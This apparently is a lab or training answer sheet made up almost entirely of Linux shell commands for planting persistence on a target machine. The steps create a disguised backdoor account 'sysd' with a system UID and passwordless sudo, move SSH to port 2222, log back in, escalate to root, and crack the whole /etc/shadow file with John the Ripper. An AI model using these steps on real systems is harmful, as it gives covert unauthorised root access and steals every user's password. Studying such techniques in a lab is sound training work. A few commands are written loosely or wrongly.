#Step 1: Shadow People
#Create a secret user named sysd. Make sure this user doesn't have a home folder created:
sudo adduser --no-create-home sysd

#Give your secret user a password:
sudo passwd <add password>

#Give your secret user a system UID < 1000:
sudo usermod -u <select UID Number> sysd

#Give your secret user the same GID:
sudo groupmod -g <Use UID Number> sysd

#Give your secret user full sudo access without the need for a password:
#As root use visudo command, then give sysd ALL=(ALL) NOPASSWD:ALL save and exit.

#Test that sudo access works without your password:
sudo -l
su sysd #if no password is requested it worked
sudo rm -R sysd #needed to delete home directory if you missed that instruction

#Step 2: Smooth Sailing
#Edit made to sshd_config file:
Port 2222

#Step 3: Testing Your Configuration Update
#Restart the SSH service:
sudo service ssh restart

#Command to Exit the root account:
exit

#SSH to the target machine using your sysd account and port 2222:
ssh sysd@<Target Machine IP> -p 2222

#Use sudo command to switch to the root user:
sudo su

#Step 4: Crack All the Passwords
#SSH back to the system using your sysd account and port 2222:
ssh sysd@<Target Machine IP> -p 2222

#Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
sudo su to escalate user
John /etc/shadow